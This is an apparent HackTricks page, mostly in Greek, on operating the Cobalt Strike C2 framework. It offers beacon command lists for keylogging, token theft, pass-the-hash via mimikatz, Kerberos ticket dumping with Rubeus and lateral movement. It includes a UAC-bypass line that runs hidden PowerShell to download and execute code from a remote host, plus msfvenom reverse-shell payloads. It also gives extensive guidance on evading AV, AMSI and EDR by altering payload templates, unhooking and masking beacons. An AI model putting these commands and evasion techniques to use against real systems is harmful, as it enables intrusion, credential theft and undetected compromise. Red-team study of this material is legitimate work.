# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` και έπειτα μπορείς να επιλέξεις πού θα γίνεται η ακρόαση, τι είδους beacon θα χρησιμοποιηθεί (http, dns, smb...) και άλλα.

### Peer2Peer Listeners

Τα beacons αυτών των listeners δεν χρειάζεται να επικοινωνούν απευθείας με το C2· μπορούν να επικοινωνούν μαζί του μέσω άλλων beacons.

`Cobalt Strike -> Listeners -> Add/Edit` και έπειτα πρέπει να επιλέξεις τα TCP ή SMB beacons

* Το **TCP beacon θα ορίσει έναν listener στην επιλεγμένη θύρα**. Για να συνδεθείς σε ένα TCP beacon, χρησιμοποίησε την εντολή `connect <ip> <port>` από ένα άλλο beacon
* Το **smb beacon θα ακούει σε ένα pipename με το επιλεγμένο όνομα**. Για να συνδεθείς σε ένα SMB beacon, πρέπει να χρησιμοποιήσεις την εντολή `link [target] [pipe]`.

### Δημιουργία και φιλοξενία payloads

#### Δημιουργία payloads σε αρχεία

`Attacks -> Packages ->`

* **`HTMLApplication`** για αρχεία HTA
* **`MS Office Macro`** για έγγραφο Office με macro
* **`Windows Executable`** για ένα .exe, .dll ή service .exe
* **`Windows Executable (S)`** για ένα **stageless** .exe, .dll ή service .exe (το stageless είναι καλύτερο από το staged, καθώς έχει λιγότερα IoCs)

#### Δημιουργία και φιλοξενία payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Αυτό θα δημιουργήσει ένα script/εκτελέσιμο για τη λήψη του beacon από το Cobalt Strike σε μορφές όπως: bitsadmin, exe, powershell και python

#### Φιλοξενία payloads

Αν έχεις ήδη το αρχείο που θέλεις να φιλοξενήσεις σε έναν web server, απλώς πήγαινε στο `Attacks -> Web Drive-by -> Host File` και επίλεξε το αρχείο προς φιλοξενία και τη διαμόρφωση του web server.

### Επιλογές Beacon

<details>
<summary>Επιλογές και εντολές Beacon</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Ένα custom agent χρειάζεται μόνο να επικοινωνεί με το HTTP/S protocol του Cobalt Strike Team Server (προεπιλεγμένο malleable C2 profile) για να κάνει register/check-in και να λαμβάνει tasks. Υλοποιήστε τα ίδια URIs/headers/metadata crypto που ορίζονται στο profile, ώστε να επαναχρησιμοποιήσετε το Cobalt Strike UI για tasking και output.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Ένα Aggressor Script (π.χ. `CustomBeacon.cna`) μπορεί να περιβάλλει τη δημιουργία payload για το non-Windows beacon, ώστε οι operators να επιλέγουν τον listener και να παράγουν ELF payloads απευθείας από το GUI.
- Παραδείγματα Linux task handlers που εκτίθενται στο Team Server: `sleep`, `cd`, `pwd`, `shell` (εκτέλεση αυθαίρετων εντολών), `ls`, `upload`, `download` και `exit`. Αυτά αντιστοιχούν στα task IDs που αναμένει το Team Server και πρέπει να υλοποιηθούν server-side, ώστε να επιστρέφουν output στην κατάλληλη μορφή.
- Η υποστήριξη BOF στο Linux μπορεί να προστεθεί φορτώνοντας Beacon Object Files in-process με το [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (υποστηρίζει επίσης BOFs τύπου Outflank), επιτρέποντας την εκτέλεση modular post-exploitation μέσα στο context/privileges του implant, χωρίς δημιουργία νέων processes.<sup>[[2]](#references)[[3]](#references)</sup>
- Ενσωματώστε έναν SOCKS handler στο custom beacon, ώστε να διατηρήσετε parity στο pivoting με τα Windows Beacons: όταν ο operator εκτελεί `socks <port>`, το implant θα πρέπει να ανοίγει έναν local proxy για τη δρομολόγηση των operator tools μέσω του compromised Linux host προς internal networks.

## Opsec

### Execute-Assembly

Το **`execute-assembly`** χρησιμοποιεί ένα **sacrificial process** μέσω remote process injection για να εκτελέσει το υποδεικνυόμενο πρόγραμμα. Αυτό είναι πολύ noisy, καθώς για την έγχυση σε ένα process χρησιμοποιούνται ορισμένα Win APIs τα οποία ελέγχει κάθε EDR. Ωστόσο, υπάρχουν ορισμένα custom tools που μπορούν να χρησιμοποιηθούν για τη φόρτωση κάποιου στοιχείου στο ίδιο process:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Στο Cobalt Strike μπορείτε επίσης να χρησιμοποιήσετε BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Το agressor script `https://github.com/outflanknl/HelpColor` θα δημιουργήσει την εντολή `helpx` στο Cobalt Strike, η οποία θα προσθέτει χρώματα στις εντολές, υποδεικνύοντας αν είναι BOFs (πράσινο), αν είναι Frok&Run (κίτρινο) και παρόμοιες περιπτώσεις, ή αν είναι ProcessExecution, injection ή κάτι παρόμοιο (κόκκινο). Αυτό βοηθά να γνωρίζετε ποιες εντολές είναι πιο stealthy.

### Modern in-process post-execution

Οι πρόσφατες εκδόσεις προσθέτουν δύο εναλλακτικές όταν ένα classic COFF BOF είναι υπερβολικά περιορισμένο:

- Το **Beacon Interpreter** κάνει compile C στο Team Server σε intermediate bytecode και το εκτελεί σε ένα VM ενσωματωμένο στο Beacon. Το bytecode παραμένει data αντί για native executable code, οπότε αποφεύγεται η επιπλέον executable allocation και η μετάβαση δικαιωμάτων από RW σε RX που απαιτείται συνήθως για τη φόρτωση ενός BOF. Τα scripts μπορούν να κάνουν import το Beacon API και να δηλώνουν BOF-style Dynamic Function Resolution (DFR) prototypes.
- Το **BOF-PE** φορτώνει ένα πλήρες EXE ή DLL στο τρέχον Beacon. Αυτή η μορφή υποστηρίζει κανονικά PE imports, exception handling, πιο πλούσια C++ και external libraries, διατηρώντας παράλληλα το Beacon API. Είναι πιο βαρύ από ένα μικρό COFF BOF, επομένως χρησιμοποιήστε το μόνο όταν το πρόσθετο runtime είναι χρήσιμο.
```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```
Αυτοί οι μηχανισμοί μειώνουν τα signals που σχετίζονται με τον loader, όχι την τηλεμετρία που παράγεται από τις ενέργειες του script ή τις κλήσεις Windows API.<sup>[[8]](#references)</sup>

### Ενεργήστε ως ο χρήστης

Θα μπορούσατε να ελέγξετε events όπως `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Ελέγξτε όλα τα interactive logons για να γνωρίζετε το συνηθισμένο ωράριο λειτουργίας.
- System EID 12,13 - Ελέγξτε τη συχνότητα των shutdown/startup/sleep.
- Security EID 4624/4625 - Ελέγξτε τα εισερχόμενα έγκυρα/μη έγκυρα NTLM attempts.
- Security EID 4648 - Αυτό το event δημιουργείται όταν χρησιμοποιούνται plaintext credentials για logon. Αν το δημιούργησε μια process, το binary ενδέχεται να έχει τα credentials σε clear text μέσα σε ένα config file ή στον κώδικα.

Όταν χρησιμοποιείτε το `jump` από το cobalt strike, είναι προτιμότερο να χρησιμοποιείτε τη μέθοδο `wmi_msbuild`, ώστε η νέα process να φαίνεται πιο legit.

### Χρησιμοποιήστε computer accounts

Είναι συνηθισμένο οι defenders να ελέγχουν περίεργες συμπεριφορές που δημιουργούνται από users και να **εξαιρούν service accounts και computer accounts όπως το `*$` από το monitoring τους**. Θα μπορούσατε να χρησιμοποιήσετε αυτούς τους λογαριασμούς για lateral movement ή privilege escalation.

### Χρησιμοποιήστε stageless payloads

Τα stageless payloads είναι λιγότερο noisy από τα staged, επειδή δεν χρειάζεται να κατεβάσουν ένα δεύτερο stage από τον C2 server. Αυτό σημαίνει ότι δεν δημιουργούν network traffic μετά την αρχική σύνδεση, με αποτέλεσμα να είναι λιγότερο πιθανό να εντοπιστούν από network-based defenses.

### Tokens & Token Store

Να είστε προσεκτικοί όταν κλέβετε ή δημιουργείτε tokens, επειδή ένα EDR μπορεί να κάνει enumerate τα thread tokens και να εντοπίσει ένα **token που ανήκει σε διαφορετικό user** ή ακόμη και στο SYSTEM μέσα στην process.

Αυτό επιτρέπει την αποθήκευση tokens **ανά beacon**, ώστε να μην χρειάζεται να κλέβετε ξανά και ξανά το ίδιο token. Αυτό είναι χρήσιμο για lateral movement ή όταν χρειάζεται να χρησιμοποιήσετε ένα stolen token πολλές φορές:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Κατά το lateral movement, συνήθως είναι προτιμότερο να **κλέψετε ένα token αντί να δημιουργήσετε ένα νέο** ή να εκτελέσετε επίθεση pass the hash.

### Guardrails

Το Cobalt Strike διαθέτει μια δυνατότητα που ονομάζεται **Guardrails**, η οποία βοηθά στην αποτροπή της χρήσης συγκεκριμένων commands ή actions που θα μπορούσαν να εντοπιστούν από defenders. Τα Guardrails μπορούν να ρυθμιστούν ώστε να μπλοκάρουν συγκεκριμένα commands, όπως τα `make_token`, `jump`, `remote-exec` και άλλα που χρησιμοποιούνται συχνά για lateral movement ή privilege escalation.

Επιπλέον, το repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) περιέχει επίσης ορισμένους ελέγχους και ιδέες που θα μπορούσατε να εξετάσετε πριν εκτελέσετε ένα payload.

### Κρυπτογράφηση tickets

Σε ένα AD, να είστε προσεκτικοί με την κρυπτογράφηση των tickets. Από προεπιλογή, ορισμένα tools χρησιμοποιούν κρυπτογράφηση RC4 για Kerberos tickets, η οποία είναι λιγότερο ασφαλής από την κρυπτογράφηση AES, ενώ τα σύγχρονα environments χρησιμοποιούν από προεπιλογή AES. Αυτό μπορεί να εντοπιστεί από defenders που κάνουν monitoring για weak encryption algorithms.

### Αποφύγετε τα Defaults

Όταν χρησιμοποιείτε το Cobalt Stricke, από προεπιλογή τα SMB pipes θα έχουν τα ονόματα `msagent_####` και `"status_####"`. Αλλάξτε αυτά τα ονόματα. Είναι δυνατό να ελέγξετε τα ονόματα των υπαρχόντων pipes από το Cobal Strike με την εντολή: `ls \\.\pipe\`

Επιπλέον, με SSH sessions δημιουργείται ένα pipe με το όνομα `\\.\pipe\postex_ssh_####`. Αλλάξτε το με `set ssh_pipename "<new_name>";`.

Επίσης, σε poext exploitation attack, τα pipes `\\.\pipe\postex_####` μπορούν να τροποποιηθούν με `set pipename "<new_name>"`.

Στα Cobalt Strike profiles μπορείτε επίσης να τροποποιήσετε πράγματα όπως:

- Αποφυγή χρήσης του `rwx`
- Τον τρόπο λειτουργίας του process injection (ποια APIs θα χρησιμοποιούνται) στο block `process-inject {...}`
- Τον τρόπο λειτουργίας του "fork and run" στο block `post-ex {…}`
- Τον χρόνο sleep
- Το μέγιστο μέγεθος των binaries που θα φορτώνονται στη memory
- Το memory footprint και το DLL content με το block `stage {...}`
- Το network traffic

### Sleepmask και BeaconGate

Ένα Sleepmask μετασχηματίζει το Beacon και τις tracked heap allocations του όσο βρίσκεται σε αδράνεια και στη συνέχεια τα επαναφέρει για την εκτέλεση tasks. Οι τρέχουσες releases παρέχουν ένα evasive default, όμως τα custom Sleepmask BOFs παραμένουν χρήσιμα όταν διαφέρουν οι απαιτήσεις για το memory layout, τις allocations ή το call stack. Από την έκδοση 4.13, το default Sleepmask κάνει επίσης spoof το return address για APIs που γίνονται proxy μέσω του BeaconGate.<sup>[[8]](#references)</sup>

Το **BeaconGate** επεκτείνει αυτόν τον σχεδιασμό πέρα από το `Sleep`: επιλεγμένες WinAPI calls αναπαριστώνται ως `FUNCTION_CALL` structures και προωθούνται στο Sleepmask BOF, το οποίο μπορεί να κάνει mask το Beacon κατά την εκτέλεση της call. Το profile μπορεί να κάνει gate σε μια ομάδα (`Comms`, `Core`, `Cleanup` ή `All`) ή μόνο σε μεμονωμένα APIs:<sup>[[9]](#references)</sup>
```text
stage {
set sleep_mask "true";
set syscall_method "Indirect";

beacon_gate {
VirtualAlloc;       # Routed through BeaconGate
VirtualAllocEx;
InternetConnectA;
}
}
```
Για ένα API που παρατίθεται στο `beacon_gate`, το gate έχει προτεραιότητα έναντι του `syscall_method`. Τα APIs που δεν παρατίθενται μπορούν να συνεχίσουν να χρησιμοποιούν τη ρυθμισμένη syscall method. Οι εντολές `beacon_gate disable` και `beacon_gate enable` ενεργοποιούν και απενεργοποιούν αντίστοιχα τη λειτουργία κατά το runtime. Αποφύγετε την τυφλή ενεργοποίηση του `All`: εντολές όπως η `ps` καλούν επανειλημμένα τις `OpenProcess`/`CloseHandle` και μπορούν να προκαλέσουν απότομη αύξηση της χρήσης CPU, όταν κάθε κλήση κάνει mask και unmask το Beacon. Το Sleepmask-VS παρέχει mocked κατάσταση Beacon/Sleepmask για debugging custom gates, χωρίς να απαιτείται η επανειλημμένη δοκιμή τους μέσω ενός live implant.<sup>[[9]](#references)</sup>

### Θορυβώδη proc injections

Κατά την εισαγωγή κώδικα σε μια διεργασία, η ενέργεια αυτή είναι συνήθως πολύ θορυβώδης, επειδή **καμία κανονική διεργασία συνήθως δεν εκτελεί αυτή την ενέργεια και επειδή οι τρόποι για να γίνει είναι πολύ περιορισμένοι**. Επομένως, μπορεί να εντοπιστεί από behaviour-based detection systems. Επιπλέον, μπορεί να εντοπιστεί από EDRs που σαρώνουν το δίκτυο για **threads που περιέχουν κώδικα ο οποίος δεν βρίσκεται στον δίσκο** (αν και διεργασίες όπως οι browsers που χρησιμοποιούν JIT το κάνουν συχνά). Παράδειγμα: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | Σχέσεις PID και PPID

Κατά τη δημιουργία μιας νέας διεργασίας, είναι σημαντικό να **διατηρείται μια κανονική σχέση parent-child** μεταξύ των διεργασιών, ώστε να αποφεύγεται ο εντοπισμός. Αν το svchost.exec εκτελεί το iexplorer.exe, αυτό θα φαίνεται ύποπτο, καθώς το svchost.exe δεν είναι parent του iexplorer.exe σε ένα κανονικό περιβάλλον Windows.

Όταν δημιουργείται ένα νέο beacon στο Cobalt Strike, από προεπιλογή δημιουργείται μια διεργασία που χρησιμοποιεί το **`rundll32.exe`** για να εκτελέσει το νέο listener. Αυτό δεν είναι ιδιαίτερα stealthy και μπορεί να εντοπιστεί εύκολα από EDRs. Επιπλέον, το `rundll32.exe` εκτελείται χωρίς args, γεγονός που το καθιστά ακόμη πιο ύποπτο.

Με την ακόλουθη εντολή του Cobalt Strike, μπορείτε να καθορίσετε διαφορετική διεργασία για τη δημιουργία του νέου beacon, καθιστώντας το λιγότερο ανιχνεύσιμο:
```bash
spawnto x86 svchost.exe
```
Μπορείτε επίσης να αλλάξετε αυτήν τη ρύθμιση **`spawnto_x86` και `spawnto_x64`** σε ένα profile.

### Proxying attackers traffic

Οι attackers μερικές φορές χρειάζεται να μπορούν να εκτελούν εργαλεία τοπικά, ακόμη και σε Linux machines, και να κάνουν την κίνηση των victims να φτάνει στο εργαλείο (π.χ. NTLM relay).

Επιπλέον, μερικές φορές, για να πραγματοποιήσουν μια επίθεση pass-the.hash ή pass-the-ticket, είναι πιο stealthy για τους attackers να **προσθέσουν αυτό το hash ή ticket στη δική τους διεργασία LSASS** τοπικά και έπειτα να κάνουν pivot από αυτήν, αντί να τροποποιήσουν μια διεργασία LSASS σε machine ενός victim.

Ωστόσο, χρειάζεται να είστε **προσεκτικοί με την παραγόμενη κίνηση**, καθώς ενδέχεται να στέλνετε ασυνήθιστη κίνηση (kerberos;) από τη διεργασία του backdoor σας. Για αυτό μπορείτε να κάνετε pivot σε μια browser διεργασία (αν και ενδέχεται να εντοπιστείτε κάνοντας injection στον εαυτό σας σε μια διεργασία, οπότε σκεφτείτε έναν stealth τρόπο για να το κάνετε).


### Avoiding AVs

#### AV/AMSI/ETW Bypass

Ελέγξτε τη σελίδα:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Συνήθως, στο `/opt/cobaltstrike/artifact-kit` μπορείτε να βρείτε τον κώδικα και τα pre-compiled templates (στο `/src-common`) των payloads που πρόκειται να χρησιμοποιήσει το cobalt strike για να δημιουργήσει τα binary beacons.

Χρησιμοποιώντας το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) με το generated backdoor (ή απλώς με το compiled template), μπορείτε να βρείτε τι προκαλεί την ενεργοποίηση του defender. Συνήθως πρόκειται για ένα string. Επομένως, μπορείτε απλώς να τροποποιήσετε τον κώδικα που δημιουργεί το backdoor, ώστε αυτό το string να μην εμφανίζεται στο τελικό binary.

Μετά την τροποποίηση του κώδικα, εκτελέστε απλώς το `./build.sh` από τον ίδιο κατάλογο και αντιγράψτε τον φάκελο `dist-pipe/` στον Windows client, στη διαδρομή `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Μην ξεχάσετε να φορτώσετε το aggressive script `dist-pipe\artifact.cna`, ώστε να υποδείξετε στο Cobalt Strike να χρησιμοποιεί τους πόρους από τον δίσκο που θέλουμε και όχι αυτούς που έχουν φορτωθεί.

#### Resource Kit

Ο φάκελος ResourceKit περιέχει τα templates για τα script-based payloads του Cobalt Strike, συμπεριλαμβανομένων των PowerShell, VBA και HTA.

Χρησιμοποιώντας το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) με τα templates, μπορείτε να εντοπίσετε τι δεν αρέσει στον Defender (σε αυτή την περίπτωση το AMSI) και να το τροποποιήσετε:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Τροποποιώντας τις γραμμές που εντοπίστηκαν, μπορεί κανείς να δημιουργήσει ένα template που δεν θα ανιχνεύεται.

Μην ξεχάσετε να φορτώσετε το aggressive script `ResourceKit\resources.cna`, ώστε να υποδείξετε στο Cobalt Strike να χρησιμοποιεί τους πόρους από τον δίσκο που θέλουμε και όχι αυτούς που έχουν φορτωθεί.

#### Function hooks | Syscall

Το function hooking είναι μια πολύ συνηθισμένη μέθοδος των ERDs για την ανίχνευση κακόβουλης δραστηριότητας. Το Cobalt Strike σάς επιτρέπει να παρακάμψετε αυτά τα hooks χρησιμοποιώντας **syscalls** αντί για τις τυπικές κλήσεις Windows API με το config **`None`**, ή να χρησιμοποιήσετε την έκδοση `Nt*` μιας συνάρτησης με τη ρύθμιση **`Direct`**, ή απλώς να παρακάμψετε τη συνάρτηση `Nt*` με την επιλογή **`Indirect`** στο malleable profile. Ανάλογα με το σύστημα, μια επιλογή μπορεί να είναι πιο stealth από κάποια άλλη.

Αυτό μπορεί να ρυθμιστεί στο profile ή χρησιμοποιώντας την εντολή **`syscall-method`**

Ωστόσο, αυτό μπορεί επίσης να είναι noisy.

Μια επιλογή που παρέχει το Cobalt Strike για την παράκαμψη των function hooks είναι η αφαίρεση αυτών των hooks με το [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Μπορείτε επίσης να ελέγξετε ποιες συναρτήσεις έχουν γίνει hooked με τα [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) ή [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Διάφορες εντολές Cobalt Strike</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>



## References

- [1] [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Πρότυπο nix BOF της Outflank](https://github.com/outflanknl/nix_bof_template)
- [4] [Ανάλυση του Unit42 για την κρυπτογράφηση metadata του Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Ημερολόγιο του SANS ISC σχετικά με την κίνηση του Cobalt Strike](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13: Χαμένοι στη μετάφραση](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10: Μέσω του BeaconGate](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
